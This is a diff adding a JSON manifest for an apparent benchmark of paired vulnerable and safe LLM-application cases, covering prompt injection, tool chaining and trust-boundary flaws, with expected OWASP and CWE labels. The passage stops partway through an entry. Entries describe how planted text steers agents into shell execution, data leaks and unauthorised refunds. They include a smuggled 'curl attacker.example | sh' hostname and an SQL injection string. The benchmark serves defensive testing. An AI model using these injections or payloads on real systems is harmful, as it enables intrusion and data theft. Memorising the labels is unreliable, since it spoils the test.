@@ -1,0 +1,1392 @@
+{
+  "version": 1,
+  "owasp_reference": "OWASP Top 10 for LLM Applications 2025",
+  "scenarios": [
+    {
+      "id": "ipi-scraped-page-shell-tool",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "LangGraph DevOps agent that loads a setup guide from a user-supplied URL and works on the host.",
+      "cases": [
+        {
+          "path": "ipi-scraped-page-shell-tool/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-78"
+          ],
+          "source": "Web page text loaded with WebBaseLoader and placed in the agent's user message",
+          "sink": "LangChain ShellTool given to the same agent",
+          "why": "Whoever controls the page (or injects text into it) controls what the agent reads, and the agent is told to run the steps, so hidden instructions become arbitrary shell commands on the host."
+        },
+        {
+          "path": "ipi-scraped-page-shell-tool/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-78"
+          ],
+          "source": "Web page text loaded with WebBaseLoader and placed in the agent's user message",
+          "sink": "run_check tool limited to a Literal of three checks mapped to fixed argv",
+          "why": "The page still reaches the model, but the only side-effecting tool runs one of three fixed read-only commands, so injected text cannot choose what executes."
+        }
+      ]
+    },
+    {
+      "id": "ipi-support-ticket-refund-tool",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "Helpdesk bot that reads a customer ticket and resolves it with an OpenAI tool call.",
+      "cases": [
+        {
+          "path": "ipi-support-ticket-refund-tool/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-862"
+          ],
+          "source": "Ticket subject and description from the helpdesk API, written by the customer",
+          "sink": "issue_refund tool call executed directly with POST /refunds",
+          "why": "A customer can write instructions in the ticket that make the model refund any order for any amount; the tool call runs with no check or approval."
+        },
+        {
+          "path": "ipi-support-ticket-refund-tool/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-862"
+          ],
+          "source": "Ticket subject and description from the helpdesk API, written by the customer",
+          "sink": "issue_refund tool call turned into a pending_review refund proposal",
+          "why": "The model can only propose a refund; a support lead approves or rejects it in the review queue before any money moves."
+        }
+      ]
+    },
+    {
+      "id": "ipi-email-inbox-send-email",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "Mailbox assistant that reads unread email over IMAP and answers it with Claude.",
+      "cases": [
+        {
+          "path": "ipi-email-inbox-send-email/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-441"
+          ],
+          "source": "Body of an unread email fetched with imaplib, from any external sender",
+          "sink": "send_email tool_use block executed through smtplib from the user's account",
+          "why": "Any sender can embed instructions that make the assistant send arbitrary mail to arbitrary recipients from the user's account, with no approval."
+        },
+        {
+          "path": "ipi-email-inbox-send-email/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-441"
+          ],
+          "source": "Body of an unread email fetched with imaplib, from any external sender",
+          "sink": "Model text saved with IMAP APPEND as a draft addressed to the original sender",
+          "why": "The model has no tools; its output is only a draft that the user reviews and sends by hand, so injected text cannot send anything."
+        }
+      ]
+    },
+    {
+      "id": "ipi-uploaded-contracts-crm-update",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "LlamaIndex ReAct agent that reconciles customer-uploaded contracts with CRM records.",
+      "cases": [
+        {
+          "path": "ipi-uploaded-contracts-crm-update/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-862"
+          ],
+          "source": "Contract files uploaded by customers, retrieved through a VectorStoreIndex query engine tool",
+          "sink": "update_account FunctionTool that writes payment_terms, discount_pct or billing_email for a model-chosen account id",
+          "why": "A customer can plant instructions in an uploaded contract that make the agent change the discount or billing email on their own or any other account."
+        },
+        {
+          "path": "ipi-uploaded-contracts-crm-update/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-862"
+          ],
+          "source": "Contract files uploaded by customers, retrieved through a VectorStoreIndex query engine tool",
+          "sink": "get_account FunctionTool that only runs a parameterized SELECT",
+          "why": "The agent's only database tool is read-only and its output is a report for the account manager, who edits the CRM by hand."
+        }
+      ]
+    },
+    {
+      "id": "ipi-github-issue-triage-exec",
+      "category": "indirect-prompt-injection",
+      "language": "typescript",
+      "summary": "Vercel AI SDK triage bot that reads a GitHub issue and runs tests to reproduce it.",
+      "cases": [
+        {
+          "path": "ipi-github-issue-triage-exec/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-78"
+          ],
+          "source": "GitHub issue title and body fetched from the REST API; any GitHub user can open an issue",
+          "sink": "runTests tool passing a model-chosen command string to child_process.exec",
+          "why": "An issue author can write instructions that make the model run any shell command on the triage host, where GITHUB_TOKEN is in the environment."
+        },
+        {
+          "path": "ipi-github-issue-triage-exec/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-78"
+          ],
+          "source": "GitHub issue title and body fetched from the REST API; any GitHub user can open an issue",
+          "sink": "runTests tool taking a z.enum suite mapped to fixed npm argv through execFile",
+          "why": "The model can only pick one of three predefined suites; the program and its arguments are fixed in code and no shell is used."
+        }
+      ]
+    },
+    {
+      "id": "ipi-slack-history-http-tool",
+      "category": "indirect-prompt-injection",
+      "language": "javascript",
+      "summary": "Slack digest bot that summarizes a channel and files follow-up tasks through an OpenAI tool.",
+      "cases": [
+        {
+          "path": "ipi-slack-history-http-tool/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-918"
+          ],
+          "source": "Slack channel history from conversations.history, including messages from guests and Slack Connect users",
+          "sink": "http_request tool: fetch to a model-chosen URL and method carrying the tracker bearer token",
+          "why": "A message in the channel can instruct the model to send requests anywhere, leaking TRACKER_TOKEN and channel content or calling internal endpoints."
+        },
+        {
+          "path": "ipi-slack-history-http-tool/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-918"
+          ],
+          "source": "Slack channel history from conversations.history, including messages from guests and Slack Connect users",
+          "sink": "create_task tool: POST to a tracker URL fixed in code with only a length-limited title",
+          "why": "URL, method and headers are fixed in code; the most injected text can do is create a task title, which any channel member could already ask for."
+        }
+      ]
+    },
+    {
+      "id": "ipi-uploaded-doc-note-write-path",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "FastAPI endpoint that turns an uploaded document into a markdown note whose filename the model picks.",
+      "cases": [
+        {
+          "path": "ipi-uploaded-doc-note-write-path/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-22"
+          ],
+          "source": "Uploaded file contents read from UploadFile",
+          "sink": "Path.write_text on NOTES_DIR / model-chosen filename",
+          "why": "Text in the upload can steer the model's JSON filename to an absolute path or a ../ sequence, so attacker content is written anywhere the service can write."
+        },
+        {
+          "path": "ipi-uploaded-doc-note-write-path/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-22"
+          ],
+          "source": "Uploaded file contents read from UploadFile",
+          "sink": "Path.write_text after basename, random prefix, resolve() and is_relative_to(NOTES_DIR)",
+          "why": "The model-chosen name is reduced to a basename, prefixed, required to end in .md and confined to the notes directory."
+        }
+      ]
+    },
+    {
+      "id": "ipi-forum-retriever-send-email",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "LangGraph support agent that answers from indexed public forum posts and can send email.",
+      "cases": [
+        {
+          "path": "ipi-forum-retriever-send-email/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-200"
+          ],
+          "source": "Public forum posts retrieved from a Chroma vector store through the search_forum tool",
+          "sink": "send_email tool with model-chosen recipient, subject and body",
+          "why": "Anyone can post on the forum; a retrieved post can tell the agent to email the conversation, including customer details, to an outside address."
+        },
+        {
+          "path": "ipi-forum-retriever-send-email/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-200"
+          ],
+          "source": "Public forum posts retrieved from a Chroma vector store through the search_forum tool",
+          "sink": "send_email tool whose recipient is a Literal team key mapped to two internal addresses",
+          "why": "Recipients are fixed in code, so an injected post cannot get mail sent outside the internal support teams."
+        }
+      ]
+    },
+    {
+      "id": "ipi-web-search-results-bash-loop",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "Claude build-fixing agent loop with a web search tool and a bash tool.",
+      "cases": [
+        {
+          "path": "ipi-web-search-results-bash-loop/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-78"
+          ],
+          "source": "Web search result titles and snippets returned to the model as tool_result content",
+          "sink": "bash tool executed with subprocess.run(shell=True)",
+          "why": "Search results are attacker-influenced (for example by SEO poisoning); they are fed back to the model, which can then run any command on the build host without review."
+        },
+        {
+          "path": "ipi-web-search-results-bash-loop/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-78"
+          ],
+          "source": "Web search result titles and snippets returned to the model as tool_result content",
+          "sink": "bash tool gated by an interactive operator approval prompt",
+          "why": "Every command is shown to the operator and runs only after an explicit y; a declined command is reported back to the model."
+        }
+      ]
+    },
+    {
+      "id": "ipi-crm-notes-summary-html",
+      "category": "indirect-prompt-injection",
+      "language": "typescript",
+      "summary": "Express route that summarizes CRM account notes with OpenAI and renders an HTML brief.",
+      "cases": [
+        {
+          "path": "ipi-crm-notes-summary-html/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-79"
+          ],
+          "source": "CRM notes fetched from the CRM API, which include logged customer emails and web form text",
+          "sink": "Model-written HTML interpolated into the page sent with res.send",
+          "why": "A note can instruct the model to emit script or event-handler markup, which then runs in the account manager's browser session."
+        },
+        {
+          "path": "ipi-crm-notes-summary-html/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-79"
+          ],
+          "source": "CRM notes fetched from the CRM API, which include logged customer emails and web form text",
+          "sink": "Model text passed through escapeHtml inside a pre element",
+          "why": "The model output is treated as plain text and HTML-escaped before it reaches the page."
+        }
+      ]
+    },
+    {
+      "id": "ipi-calendar-invites-attendee-tool",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "Calendar triage job that lets the OpenAI Responses API act on incoming meeting invites.",
+      "cases": [
+        {
+          "path": "ipi-calendar-invites-attendee-tool/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-200"
+          ],
+          "source": "Event titles and descriptions written by external invite organizers",
+          "sink": "add_attendee and respond function calls applied with Calendar events.patch on a model-chosen event id",
+          "why": "An invite description can make the model add an outside attendee to any event on the calendar, leaking meeting details and join links."
+        },
+        {
+          "path": "ipi-calendar-invites-attendee-tool/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-200"
+          ],
+          "source": "Event titles and descriptions written by external invite organizers",
+          "sink": "responses.parse into a Literal RSVP status, applied only to event ids from the fetched list",
+          "why": "The model can only set an RSVP status from a fixed set on invites already listed; it cannot add attendees or touch other events."
+        }
+      ]
+    },
+    {
+      "id": "ipi-product-reviews-listing-update",
+      "category": "indirect-prompt-injection",
+      "language": "python",
+      "summary": "Merchandising job that scrapes marketplace reviews and updates the catalog listing.",
+      "cases": [
+        {
+          "path": "ipi-product-reviews-listing-update/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-862"
+          ],
+          "source": "Review text scraped with requests and BeautifulSoup",
+          "sink": "update_listing tool call that PATCHes title and badge on a model-chosen SKU",
+          "why": "A review can tell the model to rewrite the title or badge of any SKU in the catalog."
+        },
+        {
+          "path": "ipi-product-reviews-listing-update/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-1427",
+            "CWE-862"
+          ],
+          "source": "Review text scraped with requests and BeautifulSoup",
+          "sink": "Tool-less classification into Literal fields; a second call picks an enum badge applied to the SKU from code",
+          "why": "Only validated enum values from the quarantined call reach the privileged call, the badge is checked against an allowlist and the SKU comes from the caller."
+        }
+      ]
+    },
+    {
+      "id": "chain-kubectl-tool-dispatch",
+      "category": "tool-chaining",
+      "language": "python",
+      "summary": "On-call chat bot with a manual OpenAI tool-dispatch loop around kubectl.",
+      "cases": [
+        {
+          "path": "chain-kubectl-tool-dispatch/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-78",
+            "CWE-77"
+          ],
+          "source": "tool_call.function.arguments produced by the model",
+          "sink": "subprocess.run(f\"kubectl {args}\", shell=True)",
+          "why": "The model's argument string goes to a shell, so it can chain arbitrary commands or run destructive kubectl verbs; cluster output fed back to the model can also steer it."
+        },
+        {
+          "path": "chain-kubectl-tool-dispatch/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-78",
+            "CWE-77"
+          ],
+          "source": "tool_call.function.arguments produced by the model",
+          "sink": "subprocess.run with fixed argv picked from ACTIONS and a namespace allowlist",
+          "why": "The model only picks an action and a namespace from enums; both are checked in code and no shell is involved."
+        }
+      ]
+    },
+    {
+      "id": "chain-fastmcp-note-write-path",
+      "category": "tool-chaining",
+      "language": "python",
+      "summary": "FastMCP notes server that exposes a save_note tool to an MCP client.",
+      "cases": [
+        {
+          "path": "chain-fastmcp-note-write-path/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-22",
+            "CWE-73"
+          ],
+          "source": "Model-chosen path argument of the save_note MCP tool",
+          "sink": "Path.write_text on NOTES_ROOT / path",
+          "why": "An absolute path or ../ lets the model, or a prompt injection in the client's context, overwrite files such as ~/.bashrc or ~/.ssh/authorized_keys."
+        },
+        {
+          "path": "chain-fastmcp-note-write-path/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-22",
+            "CWE-73"
+          ],
+          "source": "Model-chosen path argument of the save_note MCP tool",
+          "sink": "Path.write_text after resolve(), is_relative_to(NOTES_ROOT) and a .md suffix check",
+          "why": "Writes are confined to markdown files inside the notes folder."
+        }
+      ]
+    },
+    {
+      "id": "chain-langchain-fetch-url-ssrf",
+      "category": "tool-chaining",
+      "language": "python",
+      "summary": "LangChain research agent with a fetch_url tool.",
+      "cases": [
+        {
+          "path": "chain-langchain-fetch-url-ssrf/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-918"
+          ],
+          "source": "Model-chosen url argument of the fetch_url tool",
+          "sink": "requests.get(url)",
+          "why": "With no host check, the model can be steered by the user or by fetched pages into requesting internal services or the cloud metadata endpoint and returning the response."
+        },
+        {
+          "path": "chain-langchain-fetch-url-ssrf/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-918"
+          ],
+          "source": "Model-chosen url argument of the fetch_url tool",
+          "sink": "requests.get after an https scheme and hostname allowlist check, with redirects disabled",
+          "why": "Only three public hosts can be fetched and a redirect cannot bounce the request elsewhere."
+        }
+      ]
+    },
+    {
+      "id": "chain-inventory-lookup-ping-shell",
+      "category": "tool-chaining",
+      "language": "python",
+      "summary": "Netops agent that looks up a service's host in an inventory API and pings it.",
+      "cases": [
+        {
+          "path": "chain-inventory-lookup-ping-shell/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-78"
+          ],
+          "source": "Hostname returned by the find_host tool (inventory records editable by many teams) and passed by the model to ping_host",
+          "sink": "os.popen(f\"ping -c 3 {host}\")",
+          "why": "A hostname such as 'db1; curl attacker.example | sh' in the inventory, or any model-chosen string, runs as a shell command."
+        },
+        {
+          "path": "chain-inventory-lookup-ping-shell/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-78"
+          ],
+          "source": "Hostname returned by the find_host tool (inventory records editable by many teams) and passed by the model to ping_host",
+          "sink": "subprocess.run argv list after a hostname regex and an internal domain suffix check",
+          "why": "No shell is used and the host must be a well-formed name under the internal domain, so neither command nor option injection is possible."
+        }
+      ]
+    },
+    {
+      "id": "chain-read-doc-send-email-recipient",
+      "category": "tool-chaining",
+      "language": "typescript",
+      "summary": "Claude assistant loop with read_document and send_email tools over an internal drive.",
+      "cases": [
+        {
+          "path": "chain-read-doc-send-email-recipient/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-200",
+            "CWE-1427"
+          ],
+          "source": "Shared drive document text returned by read_document and fed back as tool_result",
+          "sink": "nodemailer sendMail with a model-chosen to address",
+          "why": "A shared document can tell the model to email its contents, or other documents, to an outside address; recipients are unrestricted."
+        },
+        {
+          "path": "chain-read-doc-send-email-recipient/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-200",
+            "CWE-1427"
+          ],
+          "source": "Shared drive document text returned by read_document and fed back as tool_result",
+          "sink": "nodemailer sendMail with the recipient looked up in a fixed TEAM map",
+          "why": "The model can only pick one of three internal team addresses, checked with Object.hasOwn before sending."
+        }
+      ]
+    },
+    {
+      "id": "chain-mcp-fetch-url-ssrf",
+      "category": "tool-chaining",
+      "language": "typescript",
+      "summary": "TypeScript MCP server with a fetch_url tool.",
+      "cases": [
+        {
+          "path": "chain-mcp-fetch-url-ssrf/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-918"
+          ],
+          "source": "Model-chosen url argument of the fetch_url MCP tool",
+          "sink": "fetch(url)",
+          "why": "Any URL, including localhost, private ranges and metadata endpoints, is fetched from the user's machine and the body is returned to the model."
+        },
+        {
+          "path": "chain-mcp-fetch-url-ssrf/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-918"
+          ],
+          "source": "Model-chosen url argument of the fetch_url MCP tool",
+          "sink": "fetch after an https and hostname allowlist check, with redirect set to error",
+          "why": "Only three named hosts can be reached and redirects are refused."
+        }
+      ]
+    },
+    {
+      "id": "chain-vercel-ai-write-file-path",
+      "category": "tool-chaining",
+      "language": "typescript",
+      "summary": "Vercel AI SDK scaffolding agent that writes project files.",
+      "cases": [
+        {
+          "path": "chain-vercel-ai-write-file-path/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-22",
+            "CWE-73"
+          ],
+          "source": "Model-chosen filePath argument of the writeProjectFile tool",
+          "sink": "fs.writeFile(path.join(PROJECT_DIR, filePath))",
+          "why": "path.join keeps ../ segments, so the model can write outside the project, for example into shell profiles, SSH config or CI files."
+        },
+        {
+          "path": "chain-vercel-ai-write-file-path/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-22",
+            "CWE-73"
+          ],
+          "source": "Model-chosen filePath argument of the writeProjectFile tool",
+          "sink": "fs.writeFile after path.resolve and a startsWith(PROJECT_DIR + path.sep) check",
+          "why": "The resolved target must stay inside the project directory or the write is refused."
+        }
+      ]
+    },
+    {
+      "id": "chain-order-tool-args-sql",
+      "category": "tool-chaining",
+      "language": "javascript",
+      "summary": "Express order-status chat where an OpenAI tool lists the signed-in customer's orders.",
+      "cases": [
+        {
+          "path": "chain-order-tool-args-sql/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM05",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-89"
+          ],
+          "source": "status argument of the list_orders tool call, steered by the customer's chat message",
+          "sink": "better-sqlite3 prepare on a query built by string concatenation",
+          "why": "The customer can get the model to pass a status such as ' OR 1=1 -- , which returns every customer's orders."
+        },
+        {
+          "path": "chain-order-tool-args-sql/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM05",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-89"
+          ],
+          "source": "status argument of the list_orders tool call, steered by the customer's chat message",
+          "sink": "Parameterized prepare(...).all(customerId, status)",
+          "why": "The model-chosen value is bound as a parameter and the customer id comes from the session."
+        }
+      ]
+    },
+    {
+      "id": "tb-retrieved-docs-in-system-prompt",
+      "category": "trust-boundary",
+      "language": "python",
+      "summary": "IT helpdesk bot that answers from an employee-editable wiki through Chroma similarity_search.",
+      "cases": [
+        {
+          "path": "tb-retrieved-docs-in-system-prompt/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Wiki pages returned by similarity_search",
+          "sink": "System message content",
+          "why": "Anyone who can edit the wiki gets system-level authority over the assistant and can override its rules, such as the SSO and endpoint security restrictions."
+        },
+        {
+          "path": "tb-retrieved-docs-in-system-prompt/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Wiki pages returned by similarity_search",
+          "sink": "Delimited <wiki> block in the user message; constant system prompt",
+          "why": "The system prompt is a constant and retrieved text is marked as reference data in the user turn; the bot has no tools and only returns text."
+        }
+      ]
+    },
+    {
+      "id": "tb-client-messages-passthrough",
+      "category": "trust-boundary",
+      "language": "python",
+      "summary": "FastAPI chat endpoint for a retail bank assistant.",
+      "cases": [
+        {
+          "path": "tb-client-messages-passthrough/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Client-supplied messages list in the request body",
+          "sink": "Appended after the system prompt and sent to chat.completions.create",
+          "why": "The caller can add system messages or forged assistant turns and override the bank's rules."
+        },
+        {
+          "path": "tb-client-messages-passthrough/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Single user message string in the request body; history kept on the server",
+          "sink": "Appended to server-side history with role user",
+          "why": "The client can only add a user turn; system and assistant turns are written by the server."
+        }
+      ]
+    },
+    {
+      "id": "tb-client-role-field",
+      "category": "trust-boundary",
+      "language": "typescript",
+      "summary": "Express booking assistant that keeps chat history per session.",
+      "cases": [
+        {
+          "path": "tb-client-role-field/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "role and content fields from the request body",
+          "sink": "Pushed into the session message history with the client's role",
+          "why": "A client can send role system and rewrite the assistant's refund policy for the rest of the session."
+        },
+        {
+          "path": "tb-client-role-field/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "content field from the request body",
+          "sink": "Pushed into the session message history with role forced to user",
+          "why": "The role is fixed by the server, so client text is always a user turn."
+        }
+      ]
+    },
+    {
+      "id": "tb-request-selects-enabled-tools",
+      "category": "trust-boundary",
+      "language": "python",
+      "summary": "Flask billing assistant whose tool registry includes a credit-issuing tool.",
+      "cases": [
+        {
+          "path": "tb-request-selects-enabled-tools/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-862"
+          ],
+          "source": "tools list in the request JSON",
+          "sink": "Tool set passed to the model and dispatched, including issue_credit on a model-chosen account",
+          "why": "Any signed-in customer can enable issue_credit by naming it in the request and then ask the model to credit any account."
+        },
+        {
+          "path": "tb-request-selects-enabled-tools/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-862"
+          ],
+          "source": "Tool set from TOOLS_BY_ROLE keyed by current_user.role",
+          "sink": "Tool set passed to the model and dispatched, including issue_credit only for billing staff",
+          "why": "The request cannot change the tool set; only billing staff sessions get issue_credit."
+        }
+      ]
+    },
+    {
+      "id": "tb-request-flag-allow-writes",
+      "category": "trust-boundary",
+      "language": "python",
+      "summary": "FastAPI issue-tracker assistant on LangGraph with an optional status-changing tool.",
+      "cases": [
+        {
+          "path": "tb-request-flag-allow-writes/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-862"
+          ],
+          "source": "allow_writes boolean in the request body",
+          "sink": "set_status tool added to the agent",
+          "why": "Any authenticated user, including read-only ones, can turn on the write tool and have the agent change issue status."
+        },
+        {
+          "path": "tb-request-flag-allow-writes/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01",
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-862"
+          ],
+          "source": "user.role from the authenticated session",
+          "sink": "set_status tool added to the agent only for maintainers and admins",
+          "why": "Write access is decided on the server from the user's tracker role, not from the request."
+        }
+      ]
+    },
+    {
+      "id": "tb-webhook-payload-in-instructions",
+      "category": "trust-boundary",
+      "language": "typescript",
+      "summary": "Next.js route that summarizes public contact-form leads with the OpenAI Responses API.",
+      "cases": [
+        {
+          "path": "tb-webhook-payload-in-instructions/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Contact form fields posted from the public website",
+          "sink": "instructions parameter of responses.create (developer-level prompt)",
+          "why": "A visitor can write instructions in the message field that run at developer authority, for example to rate every lead hot or to rewrite the stored summary."
+        },
+        {
+          "path": "tb-webhook-payload-in-instructions/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Contact form fields posted from the public website",
+          "sink": "Delimited <lead> JSON in a user input item; constant instructions",
+          "why": "Form data never enters the instructions; it is passed as user data and the output is only stored as a text summary."
+        }
+      ]
+    },
+    {
+      "id": "tb-seller-policy-in-system-prompt",
+      "category": "trust-boundary",
+      "language": "python",
+      "summary": "Marketplace buyer Q&A bot that includes the seller's store policy.",
+      "cases": [
+        {
+          "path": "tb-seller-policy-in-system-prompt/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Seller-written store policy text from the database",
+          "sink": "Anthropic system parameter",
+          "why": "A seller can write instructions that carry system authority and override marketplace rules, for example telling buyers to pay off-platform."
+        },
+        {
+          "path": "tb-seller-policy-in-system-prompt/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "Seller-written store policy text from the database",
+          "sink": "Tagged <store_policy> block in the user message; constant system prompt",
+          "why": "Seller text is placed in the user turn and labeled as data; the marketplace rules live only in the constant system prompt."
+        }
+      ]
+    },
+    {
+      "id": "tb-client-supplied-system-prompt",
+      "category": "trust-boundary",
+      "language": "javascript",
+      "summary": "Express chat API for a fitness brand using the Anthropic SDK.",
+      "cases": [
+        {
+          "path": "tb-client-supplied-system-prompt/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "system field from the request body",
+          "sink": "system parameter of anthropic.messages.create",
+          "why": "Any caller can replace the system prompt, dropping the brand's restrictions and using the endpoint as a general-purpose proxy on the company's API key."
+        },
+        {
+          "path": "tb-client-supplied-system-prompt/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-1427"
+          ],
+          "source": "persona key from the request body, looked up in a server-side PERSONAS table",
+          "sink": "system parameter of anthropic.messages.create",
+          "why": "The client only picks among fixed server-written prompts, checked with Object.hasOwn, and falls back to the default."
+        }
+      ]
+    },
+    {
+      "id": "out-text-to-sql-execute",
+      "category": "output-handling",
